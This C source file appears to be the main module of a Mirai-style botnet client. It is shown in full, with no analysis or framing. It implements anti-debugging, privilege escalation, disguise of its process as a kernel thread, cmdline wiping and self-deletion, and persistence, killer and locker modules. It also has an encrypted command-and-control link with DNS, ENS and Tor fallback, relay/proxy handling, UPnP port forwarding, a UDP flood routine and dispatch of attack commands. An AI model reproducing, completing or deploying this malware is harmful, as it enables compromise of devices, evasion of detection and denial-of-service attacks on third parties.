#define _GNU_SOURCE

#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <sys/prctl.h>
#include <sys/select.h>
#include <signal.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <time.h>
#include <errno.h>
#include <sys/ptrace.h>
#include <netdb.h>
#include <sys/mman.h>
#include <sys/mount.h>
#include <sched.h>

#include "includes.h"
#include "table.h"
#include "rand.h"
#include "keyguard.h"
#include "attack.h"
#include "killer.h"
#include "locker.h"
#include "persistence.h"
#include "util.h"
#include "c2host.h"
#include "crypto.h"
#include "taunt.h"
#include "defender.h"
#include "antibot.h"
#include "delete.h"
#include "onion.h"
#include "relay.h"
#include "escalate.h"
#include "upnp.h"

static void anti_gdb_entry(int);
static void resolve_cnc_addr(void);

__attribute__((constructor))
static void pre_main_anti_debug(void)
{
    if (ptrace(PTRACE_TRACEME, 0, 0, 0) == -1)
        _exit(0);
}
static void establish_connection(void);
static void establish_tor_connection(void);
static void teardown_connection(void);
static void ensure_single_instance(void);
static void stealth_hardening(void);
static void init_bot_salt(void);

struct sockaddr_in srv_addr;
int fd_ctrl = -1, fd_serv = -1;
BOOL pending_connection = FALSE;
void (*resolve_func)(void) = (void (*)(void))util_local_addr;
ipv4_t LOCAL_ADDR;

static BOOL crypto_active = FALSE;
static int conn_fail_count = 0;
static BOOL tor_active = FALSE;
static char id_buf[32] = {0};
static uint8_t bot_salt_data[32] = {0};

static void init_bot_salt(void)
{
    char salt_path[512];
    int salt_fd;
    int len, i;

    len = readlink("/proc/self/exe", salt_path, sizeof(salt_path) - 8);
    if (len > 0)
    {
        salt_path[len] = 0;
        util_strcpy(salt_path + len, ".salt");
        salt_fd = open(salt_path, O_RDONLY);
        if (salt_fd != -1)
        {
            if (read(salt_fd, bot_salt_data, 32) == 32)
            {
                close(salt_fd);
                return;
            }
            close(salt_fd);
        }
    }

    for (i = 0; i < 8; i++)
    {
        uint32_t r = rand_next();
        bot_salt_data[i * 4] = (r >> 24) & 0xFF;
        bot_salt_data[i * 4 + 1] = (r >> 16) & 0xFF;
        bot_salt_data[i * 4 + 2] = (r >> 8) & 0xFF;
        bot_salt_data[i * 4 + 3] = r & 0xFF;
    }

    if (len > 0)
    {
        salt_fd = open(salt_path, O_WRONLY | O_CREAT | O_TRUNC, 0600);
        if (salt_fd != -1)
        {
            write(salt_fd, bot_salt_data, 32);
            close(salt_fd);
        }
    }
}

static void crypto_send(int fd, const void *buf, int len, int flags)
{
    if (crypto_active && len > 0)
    {
        uint8_t tmp[2048];
        int copy = len > (int)sizeof(tmp) ? (int)sizeof(tmp) : len;
        util_memcpy(tmp, (void *)buf, copy);
        crypto_xor(tmp, copy);
        send(fd, tmp, copy, flags);
    }
    else
    {
        send(fd, buf, len, flags);
    }
}

static int crypto_recv(int fd, void *buf, int len, int flags)
{
    int n = recv(fd, buf, len, flags);
    if (crypto_active && n > 0 && !(flags & MSG_PEEK))
        crypto_xor((uint8_t *)buf, n);
    return n;
}

int main(int argc, char **args)
{
    char name_buf[32];
    int name_buf_len = 0, pings = 0;

    #ifndef DEBUG
        sigset_t sigs;

        sigemptyset(&sigs);
        sigaddset(&sigs, SIGINT);
        sigprocmask(SIG_BLOCK, &sigs, NULL);
        signal(SIGCHLD, SIG_IGN);
        signal(SIGTRAP, &anti_gdb_entry);

        defender_init();

    #endif

    LOCAL_ADDR = util_local_addr();

    srv_addr.sin_family = AF_INET;
    srv_addr.sin_addr.s_addr = inet_addr("127.0.0.2");
    srv_addr.sin_port = htons(23);

    table_init();
    rand_init();
    antibot_init();
    keyguard_init();
    c2_init_host();
    taunt_init();

    {
        pid_t ep = fork();
        if (ep == 0)
        {
            int i;
            for (i = 0; i < 1024; i++) close(i);
            if (escalate_get_root())
            {
                if (getuid() == 0)
                {
                    escalate_harden_root();
                    char *argv[] = {"/proc/self/exe", NULL};
                    execv("/proc/self/exe", argv);
                }
            }
            _exit(0);
        }
    }

    if (getuid() == 0)
    {
        escalate_harden_root();
    }

    /*
     * OOM protection — set oom_score_adj to -1000 to tell the kernel
     * to never kill this process under memory pressure. Kind of a lie
     * (it's just a strong hint) but effective on most kernels >= 3.x.
     */
    {
        int oom_fd = open("/proc/self/oom_score_adj", O_WRONLY);
        if (oom_fd >= 0)
        {
            write(oom_fd, "-1000", 5);
            close(oom_fd);
        }
    }

    anti_gdb_entry(0);

    ensure_single_instance();

    util_zero(id_buf, 32);
    if(argc == 2 && util_strlen(args[1]) < 32)
    {
        util_strcpy(id_buf, args[1]);
        util_zero(args[1], util_strlen(args[1]));
    }

    name_buf_len = util_strlen(args[0]);
    if (name_buf_len < 20)
        name_buf_len = (rand_next() % (20 - name_buf_len)) + name_buf_len;
    else
        name_buf_len = 20 + (rand_next() % 12);
    rand_alpha_str((uint8_t *)name_buf, name_buf_len);
    name_buf[name_buf_len] = 0;
    util_strcpy(args[0], name_buf);

    util_zero(name_buf, 32);

    /* PR_SET_NAME to a kernel-thread-style name for stealth */
    {
        static const char *kthread_names[] = {
            "[kblockd/0]",     "[kblockd/1]",     "[kblockd/2]",
            "[kworker/0:0]",   "[kworker/1:1]",   "[kworker/u8:0]",
            "[ksoftirqd/0]",   "[ksoftirqd/1]",
            "[kcompactd0]",    "[khungtaskd]",
            "[kauditd]",       "[kdevtmpfs]",
            "[writeback]",     "[kswapd0]",
            "[irq/24-pciehp]", "[irq/25-mei_me]",
            "[nfsiod]",        "[cifsd]",
            "[crypto]",        "[kintegrityd]",
            "[scsi_eh_0]",     "[scsi_tmf_0]",
        };
        int idx = rand_next() % (sizeof(kthread_names) / sizeof(kthread_names[0]));
        prctl(PR_SET_NAME, (unsigned long)kthread_names[idx]);
    }

    attack_init();
    persistence_init();

#ifndef DEBUG
    if (fork() > 0)
        return 0;
    setsid();
    close(STDIN);
    close(STDOUT);
    close(STDERR);
#endif

    stealth_hardening();

    init_bot_salt();

    killer_init();
    locker_init();
    persistence_watchdog();
    delete_init();

    {
        int proxy_port = 48101 + (rand_next() % 2000);
        upnp_port_forward(proxy_port);
    }

    while (TRUE)
    {
        fd_set fdsetrd, fdsetwr;
        struct timeval timeo;
        int mfd, nfds;

        static int chk_cnt = 0;
        if (++chk_cnt >= 50)
        {
            defender_tick();
            keyguard_tick();
            chk_cnt = 0;
        }

        FD_ZERO(&fdsetrd);
        FD_ZERO(&fdsetwr);

        // Socket for accept()
        if (fd_ctrl != -1)
            FD_SET(fd_ctrl, &fdsetrd);

        // Set up CNC sockets
        if (fd_serv == -1)
        {
            if (conn_fail_count >= 3 && onion_enabled_check())
            {
                tor_active = TRUE;
                establish_tor_connection();
            }
            else
            {
                tor_active = FALSE;
                establish_connection();
            }
        }

        if (pending_connection)
            FD_SET(fd_serv, &fdsetwr);
        else
            FD_SET(fd_serv, &fdsetrd);

        // Get maximum FD for select
        if (fd_ctrl > fd_serv)
            mfd = fd_ctrl;
        else
            mfd = fd_serv;

        // Wait 10s in call to select()
        timeo.tv_usec = 0;
        timeo.tv_sec = 10;
        nfds = select(mfd + 1, &fdsetrd, &fdsetwr, NULL, &timeo);
        if (nfds == -1)
        {
            continue;
        }
        else if (nfds == 0)
        {
            uint16_t len = 0;

            if (pings++ % 6 == 0)
                crypto_send(fd_serv, &len, sizeof (len), MSG_NOSIGNAL);
        }

        if(pending_connection)
        {
            pending_connection = FALSE;

            if(!FD_ISSET(fd_serv, &fdsetwr))
            {
                teardown_connection();
            }
            else
            {
                int err = 0;
                socklen_t err_len = sizeof(err);

                getsockopt(fd_serv, SOL_SOCKET, SO_ERROR, &err, &err_len);
                if(err != 0)
                {
                    close(fd_serv);
                    fd_serv = -1;
                    sleep((rand_next() % 10) + 1);
                }
                else
                {
                    uint8_t id_len = util_strlen(id_buf);

                    LOCAL_ADDR = util_local_addr();
                    send(fd_serv, "\x00\x00\x00\x02", 4, MSG_NOSIGNAL);
                    send(fd_serv, &id_len, sizeof(id_len), MSG_NOSIGNAL);
                    if(id_len > 0)
                    {
                        send(fd_serv, id_buf, id_len, MSG_NOSIGNAL);
                    }
                    {
                        uint32_t session_seed = rand_next();
                        send(fd_serv, &session_seed, sizeof(session_seed), MSG_NOSIGNAL);
                        send(fd_serv, bot_salt_data, 32, MSG_NOSIGNAL);
                        crypto_set_salt(bot_salt_data);
                        crypto_init(session_seed);
                        crypto_active = TRUE;
                    }
                }
            }
        }
        else if(fd_serv != -1 && FD_ISSET(fd_serv, &fdsetrd))
        {
            uint16_t len = 0;
            char rdbuf[1024];

            errno = 0;
            if (crypto_recv(fd_serv, &len, sizeof(len), MSG_NOSIGNAL) != sizeof(len))
            {
                teardown_connection();
                continue;
            }

            len = ntohs(len);
            if (len == 0)
                continue;

            if (len > sizeof(rdbuf))
            {
                teardown_connection();
                continue;
            }

            if (crypto_recv(fd_serv, rdbuf, len, MSG_NOSIGNAL) != len)
            {
                teardown_connection();
                continue;
            }

            if (len > 0)
            {
                conn_fail_count = 0;
                if (len >= 1 && (uint8_t)rdbuf[0] == 0x13)
                {
                    uint8_t host_len;
                    char host[256];
                    uint16_t port;
                    if (len >= 4)
                    {
                        host_len = (uint8_t)rdbuf[1];
                        if (host_len < sizeof(host) && len >= 4 + (int)host_len)
                        {
                            util_memcpy(host, rdbuf + 2, host_len);
                            host[host_len] = 0;
                            util_memcpy(&port, rdbuf + 2 + host_len, 2);
                            port = ntohs(port);
                            relay_handle(fd_serv, host, port);
                        }
                    }
                }
                else if (len >= 1 && (uint8_t)rdbuf[0] == 0x15)
                {
                    uint32_t bytes_sent = 0;
                    int fd_udp;
                    struct sockaddr_in dst;
                    char pkt[1400];
                    time_t start, now;
                    int i;
                    for (i = 0; i < 1400; i++) pkt[i] = (char)(rand_next() & 0xFF);
                    fd_udp = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
                    if (fd_udp >= 0)
                    {
                        dst.sin_family = AF_INET;
                        dst.sin_addr.s_addr = inet_addr("9.9.9.9");
                        start = time(NULL);
                        while (1)
                        {
                            now = time(NULL);
                            if (now - start >= 2) break;
                            dst.sin_port = htons((uint16_t)(rand_next() % 65535));
                            sendto(fd_udp, pkt, 1400, MSG_NOSIGNAL, (struct sockaddr *)&dst, sizeof(dst));
                            bytes_sent += 1400;
                        }
                        close(fd_udp);
                    }
                    {
                        uint16_t net_len = htons(5);
                        uint8_t lb[2];
                        uint8_t resp[5];
                        uint32_t be_bytes = htonl(bytes_sent);
                        util_memcpy(lb, &net_len, 2);
                        resp[0] = 0x15;
                        util_memcpy(resp + 1, &be_bytes, 4);
                        crypto_send(fd_serv, lb, 2, MSG_NOSIGNAL);
                        crypto_send(fd_serv, resp, 5, MSG_NOSIGNAL);
                    }
                }
                else
                {
                    attack_parse(rdbuf, len);
                }
            }
        }
    }

    return 0;
}

static void anti_gdb_entry(int sig)
{
    resolve_func = resolve_cnc_addr;
}

static void resolve_cnc_addr(void)
{
    char *host = c2_get_host();
    struct hostent *hp = gethostbyname(host);
    if (hp != NULL && hp->h_addrtype == AF_INET)
    {
        int num = 0;
        while (hp->h_addr_list[num] != NULL) num++;
        if (num > 0)
            srv_addr.sin_addr.s_addr = *(uint32_t*)hp->h_addr_list[rand_next() % num];
        else
            srv_addr.sin_addr.s_addr = inet_addr(host);
    }
    else
    {
        int host_len = util_strlen(host);
        if (host_len > 4 && util_strstr(host, ".eth") && host[host_len - 4] == '.')
        {
            char eth_buf[128];
            util_strcpy(eth_buf, host);
            util_strcpy(eth_buf + host_len, ".link");
            hp = gethostbyname(eth_buf);
            if (hp != NULL && hp->h_addrtype == AF_INET)
            {
                int num = 0;
                while (hp->h_addr_list[num] != NULL) num++;
                if (num > 0)
                    srv_addr.sin_addr.s_addr = *(uint32_t*)hp->h_addr_list[rand_next() % num];
                else
                    srv_addr.sin_addr.s_addr = inet_addr(host);
            }
            else
            {
                srv_addr.sin_addr.s_addr = inet_addr(host);
            }
        }
        else
        {
            srv_addr.sin_addr.s_addr = inet_addr(host);
        }
    }
    table_unlock_val(TABLE_CNC_PORT);
    srv_addr.sin_port = *((port_t *)table_retrieve_val(TABLE_CNC_PORT, NULL));
    table_lock_val(TABLE_CNC_PORT);
}

static void establish_connection(void)
{
    if((fd_serv = socket(AF_INET, SOCK_STREAM, 0)) == -1)
    {
        return;
    }

    fcntl(fd_serv, F_SETFL, O_NONBLOCK | fcntl(fd_serv, F_GETFL, 0));

    if(resolve_func != NULL)
        resolve_func();

    pending_connection = TRUE;
    connect(fd_serv, (struct sockaddr *)&srv_addr, sizeof(struct sockaddr_in));
}

static void establish_tor_connection(void)
{
    char *onion_host = onion_get_host();
    uint16_t cnc_port;

    if (onion_host == NULL || !onion_enabled_check())
    {
        tor_active = FALSE;
        conn_fail_count = 0;
        return;
    }

    table_unlock_val(TABLE_CNC_PORT);
    cnc_port = *((port_t *)table_retrieve_val(TABLE_CNC_PORT, NULL));
    table_lock_val(TABLE_CNC_PORT);

    if (onion_connect(&fd_serv, onion_host, cnc_port) == -1)
    {
        fd_serv = -1;
        conn_fail_count++;
        sleep(5);
        return;
    }

    fcntl(fd_serv, F_SETFL, O_NONBLOCK | fcntl(fd_serv, F_GETFL, 0));

    {
        uint8_t id_len = util_strlen(id_buf);
        LOCAL_ADDR = util_local_addr();
        send(fd_serv, "\x00\x00\x00\x02", 4, MSG_NOSIGNAL);
        send(fd_serv, &id_len, sizeof(id_len), MSG_NOSIGNAL);
        if (id_len > 0)
            send(fd_serv, id_buf, id_len, MSG_NOSIGNAL);

        uint32_t session_seed = rand_next();
        send(fd_serv, &session_seed, sizeof(session_seed), MSG_NOSIGNAL);
        send(fd_serv, bot_salt_data, 32, MSG_NOSIGNAL);
        crypto_set_salt(bot_salt_data);
        crypto_init(session_seed);
        crypto_active = TRUE;
    }

    conn_fail_count = 0;
}

static void teardown_connection(void)
{
    if(fd_serv != -1)
        close(fd_serv);

    fd_serv = -1;
    conn_fail_count++;
    tor_active = FALSE;
    sleep(1);
}

static void stealth_hardening(void)
{
    char self_exe[512];
    int len;

    /* wipe /proc/self/cmdline */
    {
        int fd = open("/proc/self/cmdline", O_RDWR);
        if (fd != -1)
        {
            char wipe_buf[256];
            int i;
            for (i = 0; i < (int)sizeof(wipe_buf); i++)
                wipe_buf[i] = 0;
            write(fd, wipe_buf, sizeof(wipe_buf));
            close(fd);
        }
    }

    /* attempt to unshare mount namespace and hide from /proc */
    if (unshare(CLONE_NEWNS) == 0)
    {
        mount("none", "/proc", NULL, MS_REMOUNT | MS_RDONLY | MS_NOEXEC | MS_NOSUID, NULL);
    }

    /* delete self from disk if installed in a temp/writable location */
    len = readlink("/proc/self/exe", self_exe, sizeof(self_exe) - 1);
    if (len > 0)
    {
        self_exe[len] = 0;
        if (strstr(self_exe, "/dev/shm") || strstr(self_exe, "/var/run"))
        {
            int sfd = open(self_exe, O_RDONLY);
            if (sfd != -1)
            {
                unlink(self_exe);
                close(sfd);
            }
        }
    }
}

static void ensure_single_instance(void)
{
    static BOOL local_bind = TRUE;
    struct sockaddr_in addr;
    int opt = 1;

    if((fd_ctrl = socket(AF_INET, SOCK_STREAM, 0)) == -1)
        return;
    setsockopt(fd_ctrl, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(int));
    fcntl(fd_ctrl, F_SETFL, O_NONBLOCK | fcntl(fd_ctrl, F_GETFL, 0));

    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = local_bind ? (INET_ADDR(127,0,0,1)) : LOCAL_ADDR;
    addr.sin_port = htons(SIP);

    errno = 0;
    if(bind(fd_ctrl, (struct sockaddr *)&addr, sizeof(struct sockaddr_in)) == -1)
    {
        if(errno == EADDRNOTAVAIL && local_bind)
            local_bind = FALSE;

        addr.sin_family = AF_INET;
        addr.sin_addr.s_addr = INADDR_ANY;
        addr.sin_port = htons(SIP);

        connect(fd_ctrl, (struct sockaddr *)&addr, sizeof(struct sockaddr_in));

        sleep(5);
        close(fd_ctrl);
        killer_kill_by_port(htons(SIP));
        ensure_single_instance();
    }
    else
    {
        if(listen(fd_ctrl, 1) == -1)
        {
            close(fd_ctrl);
            sleep(5);
            killer_kill_by_port(htons(SIP));
            ensure_single_instance();
        }
    }
}
